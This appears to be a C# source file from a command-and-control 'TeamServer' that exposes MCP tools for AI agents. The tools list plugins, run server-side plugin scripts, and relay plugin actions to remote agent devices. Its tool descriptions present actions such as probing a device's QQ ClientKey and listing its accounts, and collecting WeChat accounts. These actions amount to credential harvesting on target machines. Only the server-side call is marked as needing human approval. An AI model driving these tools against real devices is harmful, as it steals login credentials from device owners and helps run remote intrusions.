using System.ComponentModel;
using System.Text.Json;
using LibraNextgen.Service.Services;
using Microsoft.AspNetCore.Http;
using ModelContextProtocol.Server;

namespace LibraNextgen.Service.Mcp;

/// <summary>
/// Plugin-facing tools: list service-script functions, call server-side
/// functions (Roslyn), and invoke plugin Agent-side actions (module dispatch).
/// </summary>
[McpServerToolType]
public static class PluginTools
{
    [McpServerTool]
    [Description("列出已启用插件及其可用能力：Agent 端动作（actions，用 plugin_action 在目标设备执行，如 QQ 的 scan_accounts/list、微信的 collect）与服务端脚本函数（functions，用 plugin_call 在 TeamServer 执行）。只读。")]
    public static async Task<string> plugin_list_functions(
        ServerScriptService scripts,
        PluginService plugins,
        CancellationToken ct)
    {
        try
        {
            var enabled = await plugins.GetEnabledAsync(ct);
            var enabledIds = enabled.Select(p => p.PluginId).ToHashSet(StringComparer.Ordinal);

            var scriptItems = await scripts.ListPluginScriptsJsonAsync(ct);
            var funcsByPlugin = scriptItems
                .Where(s => enabledIds.Contains(s.PluginId))
                .ToDictionary(s => s.PluginId, s => s.Functions.ToList(), StringComparer.Ordinal);

            var result = enabled
                .Where(p => p.Entry != null || p.Actions.Count > 0 || funcsByPlugin.ContainsKey(p.PluginId))
                .Select(p => new
                {
                    pluginId = p.PluginId,
                    name = p.Name,
                    version = p.Version,
                    actions = p.Actions.Select(a => new
                    {
                        action = a.Action,
                        label = a.Label,
                        module = a.Module == null ? null : new { kind = a.Module.Kind, name = a.Module.Name, op = a.Module.Op },
                    }),
                    functions = funcsByPlugin.TryGetValue(p.PluginId, out var fns) ? fns : new List<string>(),
                });
            return McpUtils.Ok(new { plugins = result });
        }
        catch (Exception ex)
        {
            return McpUtils.Error(ex.Message);
        }
    }

    /// <summary>
    /// </summary>
    [McpServerTool]
    [Description("调用已导入插件的服务端函数（service/main.cs 导出的 C# 脚本函数）。函数在 TeamServer 上执行，可发起网络请求、读写插件包内文件。先调用 plugin_list_functions 确认插件与函数名。高危：需人工批准。")]
    public static async Task<string> plugin_call(
        [Description("插件 ID，如 com.libra.qqkey")] string pluginId,
        [Description("插件 service/main.cs 导出的函数名（用 plugin_list_functions 查看）")] string fn,
        [Description("传给函数参数的 JSON 对象字符串（可为空，如 {\"uin\":\"xxx\"}）")] string? args,
        ServerScriptService scripts,
        CancellationToken ct)
    {
        try
        {
            var json = string.IsNullOrWhiteSpace(args) ? null : args;
            if (json != null)
            {
                using var doc = JsonDocument.Parse(json);
                if (doc.RootElement.ValueKind != System.Text.Json.JsonValueKind.Object
                    && doc.RootElement.ValueKind != System.Text.Json.JsonValueKind.Array)
                    return McpUtils.Error("args 必须是 JSON 对象或数组");
            }
            var result = await scripts.InvokeAsync(pluginId, fn, json, ct);
            return McpUtils.Ok(new { pluginId, fn, data = result });
        }
        catch (OperationCanceledException)
        {
            return McpUtils.Error("script execution timed out / cancelled");
        }
        catch (Exception ex)
        {
            return McpUtils.Error(ex.InnerException?.Message ?? ex.Message);
        }
    }

    /// <summary>
    /// Invoke a plugin's Agent-side action on a target device. Mirrors
    /// PluginActionController.Execute: validates the plugin + action, builds the
    /// module input {"op", ...args}, and relays it over the agent channel
    /// (script => inline JS via the "script" relay; native => module download).
    /// </summary>
    [McpServerTool]
    [Description("调用已启用插件的 Agent 端动作（module 在目标设备上执行）：典型如 QQ 插件 com.libra.qqkey 的 scan_accounts（探测本机 QQ ClientKey 并列出账号）、list（拉取 QQ 列表）；微信插件 com.libra.wechat-file 的 collect（扫描微信账号）。先用 plugin_list_functions 查看可用 actions；args 传动作声明的参数（通常可为空）。")]
    public static async Task<string> plugin_action(
        IHttpContextAccessor http,
        PluginService plugins,
        RelayService relay,
        AgentService agents,
        [Description("插件 ID，如 com.libra.qqkey / com.libra.wechat-file")] string pluginId,
        [Description("插件动作名（meta.json actions，如 scan_accounts / list / collect）")] string action,
        [Description("目标设备 ID（用 list_agents 查询）")] string agentId,
        [Description("传给动作的 JSON 对象参数（可为空，如 {\"uin\":\"xxx\"}）")] string? args,
        CancellationToken ct = default)
    {
        var caller = McpUtils.GetCaller(http);
        if (string.IsNullOrWhiteSpace(agentId))
            return McpUtils.Error("agentId is required");
        if (!await McpUtils.IsOnlineAsync(agents, agentId))
            return McpUtils.Error($"agent '{agentId}' is offline or not found");

        try
        {
            var plugin = await plugins.GetByPluginIdAsync(pluginId, ct);
            if (plugin == null)
                return McpUtils.Error($"plugin '{pluginId}' not found");
            if (!plugin.Enabled)
                return McpUtils.Error($"plugin '{pluginId}' is disabled");

            var def = plugin.Actions.FirstOrDefault(a => a.Action == action);
            if (def == null)
                return McpUtils.Error($"action '{action}' not found in plugin '{pluginId}'");

            // Build module input: {"op": <declared>, ...args}
            var input = new Dictionary<string, object?>();
            if (!string.IsNullOrEmpty(def.Module?.Op))
                input["op"] = def.Module!.Op;
            var argDict = ParseArgs(args);
            if (argDict != null)
                foreach (var kv in argDict)
                    input[kv.Key] = kv.Value;

            string? result;
            var kind = string.Equals(def.Module?.Kind, "script", StringComparison.OrdinalIgnoreCase)
                ? "script" : "native";
            if (kind == "script")
            {
                var script = PluginService.GetScriptSource(pluginId, def.Module!.Name);
                if (script == null)
                    return McpUtils.Error($"script module '{def.Module.Name}.js' not found");
                result = await relay.RelayAndWaitAsync(agentId, "script", new
                {
                    script,
                    entry = def.Module.Entry ?? "main",
                    args = input,
                    features = new string[0],
                }, ct, TimeSpan.FromSeconds(60), caller.UserName);
            }
            else
            {
                result = await relay.RelayAndWaitAsync(agentId, def.Module!.Name, input, ct,
                    TimeSpan.FromSeconds(60), caller.UserName);
            }

            if (result == null)
                return McpUtils.Error("agent did not respond in time; pending task cancelled");
            return McpUtils.Limit(result);
        }
        catch (OperationCanceledException)
        {
            return McpUtils.Error("plugin action timed out / cancelled");
        }
        catch (Exception ex)
        {
            return McpUtils.Error(ex.InnerException?.Message ?? ex.Message);
        }
    }

    /// <summary>Parse a JSON object string into a CLR dictionary (null-safe).</summary>
    private static Dictionary<string, object?>? ParseArgs(string? json)
    {
        if (string.IsNullOrWhiteSpace(json)) return null;
        using var doc = JsonDocument.Parse(json);
        if (doc.RootElement.ValueKind != System.Text.Json.JsonValueKind.Object)
            throw new JsonException("args must be a JSON object");
        var dict = new Dictionary<string, object?>();
        foreach (var prop in doc.RootElement.EnumerateObject())
            dict[prop.Name] = ToClr(prop.Value);
        return dict;
    }

    private static object? ToClr(JsonElement e) => e.ValueKind switch
    {
        JsonValueKind.String => e.GetString(),
        JsonValueKind.Number => e.TryGetInt64(out var l) ? l : e.GetDouble(),
        JsonValueKind.True => true,
        JsonValueKind.False => false,
        JsonValueKind.Null => null,
        JsonValueKind.Array => e.EnumerateArray().Select(ToClr).ToList(),
        JsonValueKind.Object => e.EnumerateObject().ToDictionary(p => p.Name, p => ToClr(p.Value)),
        _ => e.GetRawText(),
    };
}
